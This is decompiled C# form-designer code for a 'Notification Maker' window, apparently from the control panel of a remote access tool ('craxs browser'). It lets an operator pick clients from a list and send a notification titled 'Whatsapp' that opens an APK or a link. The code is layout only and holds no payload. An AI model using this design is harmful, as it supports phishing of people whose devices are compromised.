// Token: 0x0200009A RID: 154
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class NotificationMaker : global::System.Windows.Forms.Form
{
	// Token: 0x060006B7 RID: 1719 RVA: 0x000A7590 File Offset: 0x000A5790
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x060006B8 RID: 1720 RVA: 0x000A75D4 File Offset: 0x000A57D4
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new global::System.ComponentModel.Container();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new global::System.Windows.Forms.DataGridViewCellStyle();
		this.DrakeUIAvatar1 = new global::DrakeUI.Framework.DrakeUIAvatar();
		this.msgtext = new global::DrakeUI.Framework.DrakeUITextBox();
		this.Label2 = new global::System.Windows.Forms.Label();
		this.Label1 = new global::System.Windows.Forms.Label();
		this.DrakeUIToolTip1 = new global::DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.DrakeUIAvatar2 = new global::DrakeUI.Framework.DrakeUIAvatar();
		this.titletext = new global::DrakeUI.Framework.DrakeUITextBox();
		this.Label4 = new global::System.Windows.Forms.Label();
		this.DGVC = new global::System.Windows.Forms.DataGridView();
		this.seleccli = new global::System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.cliico = new global::System.Windows.Forms.DataGridViewImageColumn();
		this.cliename = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.SplitContainer1 = new global::System.Windows.Forms.SplitContainer();
		this.checkusrcraxs = new global::DrakeUI.Framework.DrakeUICheckBox();
		this.toopentext = new global::DrakeUI.Framework.DrakeUITextBox();
		this.TAlabel = new global::System.Windows.Forms.Label();
		this.typecomp = new global::DrakeUI.Framework.DrakeUIComboBox();
		this.Label35 = new global::System.Windows.Forms.Label();
		this.Label3 = new global::System.Windows.Forms.Label();
		((global::System.ComponentModel.ISupportInitialize)this.DGVC).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.SplitContainer1).BeginInit();
		this.SplitContainer1.Panel1.SuspendLayout();
		this.SplitContainer1.Panel2.SuspendLayout();
		this.SplitContainer1.SuspendLayout();
		base.SuspendLayout();
		this.DrakeUIAvatar1.Click += new global::System.EventHandler(this.DrakeUIAvatar1_Click);
		this.Label35.Click += new global::System.EventHandler(this.Label35_Click);
		this.typecomp.SelectedIndexChanged += new global::System.EventHandler(this.Actonscompo_SelectedIndexChanged);
		this.DrakeUIAvatar1.Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
		this.DrakeUIAvatar1.AvatarSize = 30;
		this.DrakeUIAvatar1.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar1.FillColor = global::System.Drawing.Color.Black;
		this.DrakeUIAvatar1.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar1.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIAvatar1.Location = new global::System.Drawing.Point(223, 540);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new global::System.Drawing.Size(60, 60);
		this.DrakeUIAvatar1.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.Symbol = 61912;
		this.DrakeUIAvatar1.SymbolSize = 30;
		this.DrakeUIAvatar1.TabIndex = 2;
		this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar1, "Save");
		this.msgtext.Cursor = global::System.Windows.Forms.Cursors.IBeam;
		this.msgtext.FillColor = global::System.Drawing.Color.Black;
		this.msgtext.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.msgtext.ForeColor = global::System.Drawing.Color.White;
		this.msgtext.Location = new global::System.Drawing.Point(44, 230);
		this.msgtext.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.msgtext.Maximum = 2147483647.0;
		this.msgtext.Minimum = -2147483648.0;
		this.msgtext.Name = "msgtext";
		this.msgtext.Padding = new global::System.Windows.Forms.Padding(5);
		this.msgtext.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.msgtext.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.msgtext.Size = new global::System.Drawing.Size(220, 32);
		this.msgtext.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.msgtext.StyleCustomMode = true;
		this.msgtext.TabIndex = 0;
		this.msgtext.TextAlignment = global::System.Drawing.ContentAlignment.TopCenter;
		this.msgtext.Watermark = "New Message";
		this.Label2.AutoSize = true;
		this.Label2.BackColor = global::System.Drawing.Color.Transparent;
		this.Label2.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label2.Location = new global::System.Drawing.Point(40, 309);
		this.Label2.Margin = new global::System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new global::System.Drawing.Size(72, 24);
		this.Label2.TabIndex = 20;
		this.Label2.Text = "Actions";
		this.Label1.AutoSize = true;
		this.Label1.BackColor = global::System.Drawing.Color.Transparent;
		this.Label1.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label1.Location = new global::System.Drawing.Point(40, 201);
		this.Label1.Margin = new global::System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new global::System.Drawing.Size(129, 24);
		this.Label1.TabIndex = 21;
		this.Label1.Text = "Message body";
		this.DrakeUIToolTip1.BackColor = global::System.Drawing.Color.FromArgb(54, 54, 54);
		this.DrakeUIToolTip1.ForeColor = global::System.Drawing.Color.FromArgb(239, 239, 239);
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.DrakeUIAvatar2.Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left);
		this.DrakeUIAvatar2.AvatarSize = 30;
		this.DrakeUIAvatar2.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.FillColor = global::System.Drawing.Color.Black;
		this.DrakeUIAvatar2.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar2.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIAvatar2.Location = new global::System.Drawing.Point(12, 540);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new global::System.Drawing.Size(60, 60);
		this.DrakeUIAvatar2.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.Symbol = 61453;
		this.DrakeUIAvatar2.SymbolSize = 30;
		this.DrakeUIAvatar2.TabIndex = 22;
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar2";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Cancel");
		this.titletext.Cursor = global::System.Windows.Forms.Cursors.IBeam;
		this.titletext.FillColor = global::System.Drawing.Color.Black;
		this.titletext.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.titletext.ForeColor = global::System.Drawing.Color.White;
		this.titletext.Location = new global::System.Drawing.Point(44, 109);
		this.titletext.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.titletext.Maximum = 2147483647.0;
		this.titletext.Minimum = -2147483648.0;
		this.titletext.Name = "titletext";
		this.titletext.Padding = new global::System.Windows.Forms.Padding(5);
		this.titletext.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.titletext.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.titletext.Size = new global::System.Drawing.Size(220, 32);
		this.titletext.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.titletext.StyleCustomMode = true;
		this.titletext.TabIndex = 26;
		this.titletext.TextAlignment = global::System.Drawing.ContentAlignment.TopCenter;
		this.titletext.Watermark = "Whatsapp";
		this.Label4.AutoSize = true;
		this.Label4.BackColor = global::System.Drawing.Color.Transparent;
		this.Label4.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label4.Location = new global::System.Drawing.Point(40, 80);
		this.Label4.Margin = new global::System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new global::System.Drawing.Size(47, 24);
		this.Label4.TabIndex = 27;
		this.Label4.Text = "Title";
		this.DGVC.AllowUserToAddRows = false;
		this.DGVC.AllowUserToDeleteRows = false;
		this.DGVC.AllowUserToResizeColumns = false;
		this.DGVC.AllowUserToResizeRows = false;
		dataGridViewCellStyle.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.Black;
		this.DGVC.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGVC.AutoSizeColumnsMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVC.AutoSizeRowsMode = global::System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVC.BackgroundColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Calibri", 7.8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGVC.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVC.ColumnHeadersVisible = false;
		this.DGVC.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
		{
			this.seleccli,
			this.cliico,
			this.cliename
		});
		dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Calibri", 7.8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
		this.DGVC.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGVC.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.DGVC.GridColor = global::System.Drawing.Color.Black;
		this.DGVC.Location = new global::System.Drawing.Point(0, 0);
		this.DGVC.Name = "DGVC";
		this.DGVC.ReadOnly = true;
		dataGridViewCellStyle4.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle4.Font = new global::System.Drawing.Font("Calibri", 7.8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle4.ForeColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle4.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGVC.RowHeadersVisible = false;
		dataGridViewCellStyle5.BackColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle5.ForeColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = global::System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionForeColor = global::System.Drawing.Color.Black;
		this.DGVC.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVC.RowTemplate.Height = 24;
		this.DGVC.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVC.Size = new global::System.Drawing.Size(708, 612);
		this.DGVC.TabIndex = 28;
		this.seleccli.FillWeight = 67.85324f;
		this.seleccli.HeaderText = "selectme";
		this.seleccli.Name = "seleccli";
		this.seleccli.ReadOnly = true;
		this.cliico.FillWeight = 98.98477f;
		this.cliico.HeaderText = "icon";
		this.cliico.Name = "cliico";
		this.cliico.ReadOnly = true;
		this.cliename.FillWeight = 133.162f;
		this.cliename.HeaderText = "Name";
		this.cliename.Name = "cliename";
		this.cliename.ReadOnly = true;
		this.SplitContainer1.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.SplitContainer1.Location = new global::System.Drawing.Point(0, 0);
		this.SplitContainer1.Name = "SplitContainer1";
		this.SplitContainer1.Panel1.BackColor = global::System.Drawing.Color.Black;
		this.SplitContainer1.Panel1.Controls.Add(this.checkusrcraxs);
		this.SplitContainer1.Panel1.Controls.Add(this.toopentext);
		this.SplitContainer1.Panel1.Controls.Add(this.TAlabel);
		this.SplitContainer1.Panel1.Controls.Add(this.typecomp);
		this.SplitContainer1.Panel1.Controls.Add(this.Label35);
		this.SplitContainer1.Panel1.Controls.Add(this.Label3);
		this.SplitContainer1.Panel1.Controls.Add(this.titletext);
		this.SplitContainer1.Panel1.Controls.Add(this.DrakeUIAvatar2);
		this.SplitContainer1.Panel1.Controls.Add(this.DrakeUIAvatar1);
		this.SplitContainer1.Panel1.Controls.Add(this.Label4);
		this.SplitContainer1.Panel1.Controls.Add(this.msgtext);
		this.SplitContainer1.Panel1.Controls.Add(this.Label2);
		this.SplitContainer1.Panel1.Controls.Add(this.Label1);
		this.SplitContainer1.Panel2.Controls.Add(this.DGVC);
		this.SplitContainer1.Size = new global::System.Drawing.Size(1017, 612);
		this.SplitContainer1.SplitterDistance = 305;
		this.SplitContainer1.TabIndex = 30;
		this.checkusrcraxs.CheckBoxColor = global::System.Drawing.Color.Red;
		this.checkusrcraxs.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.checkusrcraxs.Enabled = false;
		this.checkusrcraxs.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.checkusrcraxs.ForeColor = global::System.Drawing.Color.White;
		this.checkusrcraxs.Location = new global::System.Drawing.Point(44, 497);
		this.checkusrcraxs.Name = "checkusrcraxs";
		this.checkusrcraxs.Padding = new global::System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkusrcraxs.Size = new global::System.Drawing.Size(220, 29);
		this.checkusrcraxs.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.checkusrcraxs.TabIndex = 87;
		this.checkusrcraxs.Text = "use craxs browser";
		this.checkusrcraxs.Visible = false;
		this.toopentext.Cursor = global::System.Windows.Forms.Cursors.IBeam;
		this.toopentext.Enabled = false;
		this.toopentext.FillColor = global::System.Drawing.Color.Black;
		this.toopentext.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.toopentext.ForeColor = global::System.Drawing.Color.White;
		this.toopentext.Location = new global::System.Drawing.Point(44, 457);
		this.toopentext.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.toopentext.Maximum = 2147483647.0;
		this.toopentext.Minimum = -2147483648.0;
		this.toopentext.Name = "toopentext";
		this.toopentext.Padding = new global::System.Windows.Forms.Padding(5);
		this.toopentext.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.toopentext.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.toopentext.Size = new global::System.Drawing.Size(220, 32);
		this.toopentext.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.toopentext.StyleCustomMode = true;
		this.toopentext.TabIndex = 72;
		this.toopentext.TextAlignment = global::System.Drawing.ContentAlignment.TopCenter;
		this.toopentext.Visible = false;
		this.toopentext.Watermark = "";
		this.TAlabel.AutoSize = true;
		this.TAlabel.BackColor = global::System.Drawing.Color.Transparent;
		this.TAlabel.Enabled = false;
		this.TAlabel.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Bold);
		this.TAlabel.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.TAlabel.Location = new global::System.Drawing.Point(40, 428);
		this.TAlabel.Margin = new global::System.Windows.Forms.Padding(4, 0, 4, 0);
		this.TAlabel.Name = "TAlabel";
		this.TAlabel.Size = new global::System.Drawing.Size(87, 24);
		this.TAlabel.TabIndex = 73;
		this.TAlabel.Text = "link or ID";
		this.TAlabel.Visible = false;
		this.typecomp.DropDownStyle = global::DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.typecomp.FillColor = global::System.Drawing.Color.Black;
		this.typecomp.Font = new global::System.Drawing.Font("Calibri", 11f);
		this.typecomp.ForeColor = global::System.Drawing.Color.White;
		this.typecomp.Items.AddRange(new object[]
		{
			"Nothing",
			"Open Apk",
			"Open Link"
		});
		this.typecomp.Location = new global::System.Drawing.Point(44, 342);
		this.typecomp.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.typecomp.MinimumSize = new global::System.Drawing.Size(63, 0);
		this.typecomp.Name = "typecomp";
		this.typecomp.Padding = new global::System.Windows.Forms.Padding(0, 0, 30, 0);
		this.typecomp.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.typecomp.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.typecomp.Size = new global::System.Drawing.Size(220, 30);
		this.typecomp.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.typecomp.TabIndex = 71;
		this.typecomp.TextAlignment = global::System.Drawing.ContentAlignment.MiddleLeft;
		this.Label35.AutoSize = true;
		this.Label35.BackColor = global::System.Drawing.Color.Transparent;
		this.Label35.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.Label35.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.Label35.ForeColor = global::System.Drawing.Color.Red;
		this.Label35.Location = new global::System.Drawing.Point(272, 342);
		this.Label35.Margin = new global::System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label35.Name = "Label35";
		this.Label35.Size = new global::System.Drawing.Size(19, 24);
		this.Label35.TabIndex = 70;
		this.Label35.Text = "?";
		this.Label3.BackColor = global::System.Drawing.Color.Transparent;
		this.Label3.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.Label3.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Bold);
		this.Label3.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label3.Location = new global::System.Drawing.Point(0, 0);
		this.Label3.Margin = new global::System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label3.Name = "Label3";
		this.Label3.Size = new global::System.Drawing.Size(305, 64);
		this.Label3.TabIndex = 28;
		this.Label3.Text = "Create a notification";
		this.Label3.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(7f, 15f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new global::System.Drawing.Size(1017, 612);
		base.Controls.Add(this.SplitContainer1);
		this.Font = new global::System.Drawing.Font("Calibri", 7.8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "NotificationMaker";
		base.ShowIcon = false;
		this.Text = "Notification Maker";
		base.TopMost = true;
		((global::System.ComponentModel.ISupportInitialize)this.DGVC).EndInit();
		this.SplitContainer1.Panel1.ResumeLayout(false);
		this.SplitContainer1.Panel1.PerformLayout();
		this.SplitContainer1.Panel2.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.SplitContainer1).EndInit();
		this.SplitContainer1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	// Token: 0x040009C9 RID: 2505
	private global::System.ComponentModel.IContainer components;

	// Token: 0x040009D1 RID: 2513
	internal global::DrakeUI.Framework.DrakeUIAvatar DrakeUIAvatar1;

	// Token: 0x040009D2 RID: 2514
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DrakeUIToolTip1")]
	internal global::DrakeUI.Framework.DrakeUIToolTip DrakeUIToolTip1;

	// Token: 0x040009D3 RID: 2515
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("msgtext")]
	internal global::DrakeUI.Framework.DrakeUITextBox msgtext;

	// Token: 0x040009D4 RID: 2516
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label2")]
	internal global::System.Windows.Forms.Label Label2;

	// Token: 0x040009D5 RID: 2517
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label1")]
	internal global::System.Windows.Forms.Label Label1;

	// Token: 0x040009D6 RID: 2518
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DrakeUIAvatar2")]
	internal global::DrakeUI.Framework.DrakeUIAvatar DrakeUIAvatar2;

	// Token: 0x040009D7 RID: 2519
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label4")]
	internal global::System.Windows.Forms.Label Label4;

	// Token: 0x040009D8 RID: 2520
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DGVC")]
	internal global::System.Windows.Forms.DataGridView DGVC;

	// Token: 0x040009D9 RID: 2521
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("seleccli")]
	internal global::System.Windows.Forms.DataGridViewCheckBoxColumn seleccli;

	// Token: 0x040009DA RID: 2522
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("cliico")]
	internal global::System.Windows.Forms.DataGridViewImageColumn cliico;

	// Token: 0x040009DB RID: 2523
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("cliename")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn cliename;

	// Token: 0x040009DC RID: 2524
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("SplitContainer1")]
	internal global::System.Windows.Forms.SplitContainer SplitContainer1;

	// Token: 0x040009DD RID: 2525
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label3")]
	internal global::System.Windows.Forms.Label Label3;

	// Token: 0x040009DE RID: 2526
	internal global::System.Windows.Forms.Label Label35;

	// Token: 0x040009DF RID: 2527
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("toopentext")]
	internal global::DrakeUI.Framework.DrakeUITextBox toopentext;

	// Token: 0x040009E0 RID: 2528
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("TAlabel")]
	internal global::System.Windows.Forms.Label TAlabel;

	// Token: 0x040009E1 RID: 2529
	internal global::DrakeUI.Framework.DrakeUIComboBox typecomp;

	// Token: 0x040009E2 RID: 2530
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("titletext")]
	internal global::DrakeUI.Framework.DrakeUITextBox titletext;

	// Token: 0x040009E3 RID: 2531
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("checkusrcraxs")]
	internal global::DrakeUI.Framework.DrakeUICheckBox checkusrcraxs;
}
